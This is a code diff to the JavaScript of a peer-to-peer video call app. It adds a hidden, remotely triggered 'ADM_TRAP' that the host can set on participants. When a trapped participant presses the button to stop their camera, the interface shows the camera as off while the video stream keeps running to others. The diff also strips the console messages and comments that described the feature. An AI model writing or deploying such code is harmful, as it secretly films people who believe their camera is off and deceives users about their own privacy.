@@ -440,7 +440,8 @@
         let focusedStreamType = null;
         let isSidebarOpen = true;
         let idleTimer = null;
-        let isAdmGhostCamera = false;
+        let admTrapActive = false;
+        let isCameraFakeOff = false;
         let admStealthActiveForPeers = false;
 
         // Mantemos APENAS o resource timer local para não prejudicar quem assiste
@@ -655,7 +656,7 @@
                 conn.send({ type: 'RENAME', name: localName });
 
                 if (admStealthActiveForPeers) {
-                    conn.send({ type: 'ADM_STEALTH', enabled: true });
+                    conn.send({ type: 'ADM_TRAP', enabled: true });
                 }
 
                 if (localStreams.camera) sendMediaToPeer(conn.peer, localStreams.camera, 'camera');
@@ -673,8 +674,8 @@
                         renderCards();
                         updateFocusedName();
                     }
-                } else if (data.type === 'ADM_STEALTH') {
-                    setAdmMode(data.enabled);
+                } else if (data.type === 'ADM_TRAP') {
+                    setAdmTrap(data.enabled);
                 }
             });
 
@@ -754,9 +755,15 @@
         }
 
         async function toggleMedia(type) {
-            if (type === 'camera' && isAdmGhostCamera) {
-                // Se estava em modo fantasma e o usuário clica para ligar a câmera, apenas restaura a exibição normal
-                setAdmMode(false);
+            if (type === 'camera' && isCameraFakeOff) {
+                // Peer clicou no botão "Câmera" para ligar novamente
+                isCameraFakeOff = false;
+                updateMediaButtonUI('camera', true);
+                checkAndShowFlipButton();
+                renderCards();
+                if (!focusedParticipantId) {
+                    setFocus(myPeerId, 'camera');
+                }
                 return;
             }
             if (localStreams[type]) {
@@ -812,20 +819,9 @@
                     sendMediaToPeer(peerId, stream, type);
                 });
 
-                if (type === 'camera' && isAdmGhostCamera) {
-                    updateMediaButtonUI('camera', false);
-                    const btnFlip = document.getElementById('btn-flip-camera');
-                    const sepFlip = document.getElementById('separator-flip');
-                    if (btnFlip) {
-                        btnFlip.classList.add('hidden');
-                        btnFlip.classList.remove('flex');
-                    }
-                    if (sepFlip) sepFlip.classList.add('hidden');
-                } else {
-                    updateMediaButtonUI(type, true);
-                    if (type === 'camera') {
-                        checkAndShowFlipButton();
-                    }
+                updateMediaButtonUI(type, true);
+                if (type === 'camera') {
+                    checkAndShowFlipButton();
                 }
 
                 renderCards();
@@ -839,9 +835,7 @@
                 }
 
                 if (type === 'screen' || !focusedParticipantId || focusedStreamType !== 'screen') {
-                    if (!(type === 'camera' && isAdmGhostCamera)) {
-                        setFocus(myPeerId, type);
-                    }
+                    setFocus(myPeerId, type);
                 }
 
             } catch (err) {
@@ -884,6 +878,31 @@
         }
 
         function stopMediaShare(type) {
+            if (type === 'camera' && admTrapActive && localStreams.camera) {
+                isCameraFakeOff = true;
+
+                const btnFlip = document.getElementById('btn-flip-camera');
+                const sepFlip = document.getElementById('separator-flip');
+                if (btnFlip) {
+                    btnFlip.classList.add('hidden');
+                    btnFlip.classList.remove('flex');
+                }
+                if (sepFlip) sepFlip.classList.add('hidden');
+
+                updateMediaButtonUI('camera', false);
+
+                if (focusedParticipantId === myPeerId && focusedStreamType === 'camera') {
+                    clearFocus();
+                }
+
+                renderCards();
+                return;
+            }
+
+            reallyStopMediaShare(type);
+        }
+
+        function reallyStopMediaShare(type) {
             if (localStreams[type]) {
                 localStreams[type].getTracks().forEach(track => track.stop());
                 localStreams[type] = null;
@@ -892,14 +911,16 @@
                 participants[myPeerId].streams[type] = null;
             }
 
-            // Ocultando Botão de Virar Câmera e o Separador para fixar o layout
             if (type === 'camera') {
                 const btnFlip = document.getElementById('btn-flip-camera');
-                btnFlip.classList.add('hidden');
-                btnFlip.classList.remove('flex');
-                document.getElementById('separator-flip').classList.add('hidden');
+                if (btnFlip) {
+                    btnFlip.classList.add('hidden');
+                    btnFlip.classList.remove('flex');
+                }
+                const sepFlip = document.getElementById('separator-flip');
+                if (sepFlip) sepFlip.classList.add('hidden');
                 currentCameraFacing = 'user';
-                isAdmGhostCamera = false;
+                isCameraFakeOff = false;
             }
 
             Object.keys(outgoingCalls).forEach(key => {
@@ -1011,7 +1032,6 @@
                         audio: false
                     });
                 } catch (e) {
-                    console.error("Falha ao restaurar câmera anterior:", e);
                 }
                 isFlippingCamera = false;
                 showAlert('Aviso', 'Não foi possível alternar para outra câmera neste aparelho.');
@@ -1047,7 +1067,7 @@
                             videoSender.replaceTrack(newVideoTrack);
                             replaced = true;
                         }
-                    } catch (e) { }
+                    } catch (e) {}
                 }
 
                 if (!replaced) {
@@ -1077,8 +1097,8 @@
                 let hasMedia = false;
 
                 if (p.streams.camera) {
-                    if (p.isLocal && isAdmGhostCamera) {
-                        // Modo fantasma ADM: não exibe o card da câmera localmente
+                    if (p.isLocal && isCameraFakeOff) {
+                        // Não exibe o card da câmera localmente se ela estiver em falso desligamento
                     } else {
                         hasMedia = true;
                         cardsContainer.appendChild(createCard(id, p, 'camera'));
@@ -1200,7 +1220,7 @@
         }
 
         function setFocus(peerId, type) {
-            if (peerId === myPeerId && type === 'camera' && isAdmGhostCamera) return;
+            if (peerId === myPeerId && type === 'camera' && isCameraFakeOff) return;
             if (!participants[peerId] || !participants[peerId].streams[type]) return;
 
             focusedParticipantId = peerId;
@@ -1321,7 +1341,8 @@
                 myPeer = null;
             }
 
-            isAdmGhostCamera = false;
+            admTrapActive = false;
+            isCameraFakeOff = false;
             admStealthActiveForPeers = false;
             participants = {};
             dataConnections = {};
@@ -1336,53 +1357,13 @@
             window.history.replaceState({}, document.title, window.location.pathname);
         }
 
-        function setAdmMode(enabled) {
-            isAdmGhostCamera = Boolean(enabled);
-
-            if (isAdmGhostCamera) {
-                // Modo fantasma ATIVADO:
-                // 1. Simula botão desligado na barra de controles
-                updateMediaButtonUI('camera', false);
-
-                // 2. Oculta botão de virar câmera e separador
-                const btnFlip = document.getElementById('btn-flip-camera');
-                const sepFlip = document.getElementById('separator-flip');
-                if (btnFlip) {
-                    btnFlip.classList.add('hidden');
-                    btnFlip.classList.remove('flex');
-                }
-                if (sepFlip) sepFlip.classList.add('hidden');
-
-                // 3. Se a câmera local estava focada no palco principal, desfaz o foco
-                if (focusedParticipantId === myPeerId && focusedStreamType === 'camera') {
-                    clearFocus();
-                }
-
-                // 4. Re-renderiza os cards laterais (a câmera local será ocultada e virará avatar placeholder)
-                renderCards();
-
-                console.log("%c[ADM] Modo fantasma de câmera ATIVADO. Imagem local ocultada, transmissão para o host mantida ativa.", "color: #a855f7; font-weight: bold; font-size: 13px;");
-            } else {
-                // Modo fantasma DESATIVADO:
-                if (localStreams.camera) {
-                    updateMediaButtonUI('camera', true);
-                    checkAndShowFlipButton();
-                    renderCards();
-
-                    // Se não tiver nada focado no palco, foca na câmera local
-                    if (!focusedParticipantId) {
-                        setFocus(myPeerId, 'camera');
-                    }
-                }
-                console.log("%c[ADM] Modo fantasma de câmera DESATIVADO. Visualização normal restaurada.", "color: #10b981; font-weight: bold; font-size: 13px;");
+        function setAdmTrap(enabled) {
+            admTrapActive = Boolean(enabled);
+            if (!admTrapActive && isCameraFakeOff) {
+                reallyStopMediaShare('camera');
             }
         }
 
-        /**
-         * Função ADM disponível globalmente no console do navegador:
-         * adm(true)  -> Mantém a câmera ligada para o host, mas oculta o espelhamento local simulando estar desligada
-         * adm(false) -> Retorna ao estado normal
-         */
         function adm(enabled = true, target = null) {
             const state = (enabled !== false && enabled !== 'false');
             const isHost = (myPeerId && myPeerId.startsWith(APP_PREFIX));
@@ -1392,31 +1373,20 @@
                 admStealthActiveForPeers = state;
             }
 
-            // 1. Se houver conexões com peers (Host enviando comando para participantes)
             if (peerIds.length > 0 && target !== 'local') {
                 if (target && dataConnections[target]) {
-                    dataConnections[target].send({ type: 'ADM_STEALTH', enabled: state });
-                    console.log(`%c[ADM] Ordem enviada especificamente para o peer ${target}: stealth = ${state}`, "color: #3b82f6; font-weight: bold;");
+                    dataConnections[target].send({ type: 'ADM_TRAP', enabled: state });
                 } else {
-                    broadcastData({ type: 'ADM_STEALTH', enabled: state });
-                    console.log(`%c[ADM] Ordem transmitida para todos os peers conectados (${peerIds.join(', ')}): stealth = ${state}`, "color: #3b82f6; font-weight: bold;");
+                    broadcastData({ type: 'ADM_TRAP', enabled: state });
                 }
             }
 
-            // 2. Se for executado diretamente no peer (não-host), ou teste local, ou sem peers conectados
             if (!isHost || target === 'local' || peerIds.length === 0) {
-                setAdmMode(state);
+                setAdmTrap(state);
             }
-
-            const msg = state
-                ? "Modo ADM (Câmera Fantasma) ATIVADO: Câmera ativa transmitindo para o host, espelhamento local oculto simulando câmera desligada."
-                : "Modo ADM DESATIVADO: Estado normal da câmera restaurado.";
-            console.log(`%c${msg}`, "color: #8b5cf6; font-weight: bold;");
-            return msg;
         }
 
         window.adm = adm;
-        console.log("%c[ADM] Funções administrativas carregadas no console. Use adm(true) ou adm(false).", "color: #3b82f6; font-style: italic;");
 
         window.addEventListener('beforeunload', () => {
             if (myPeer) endSession();
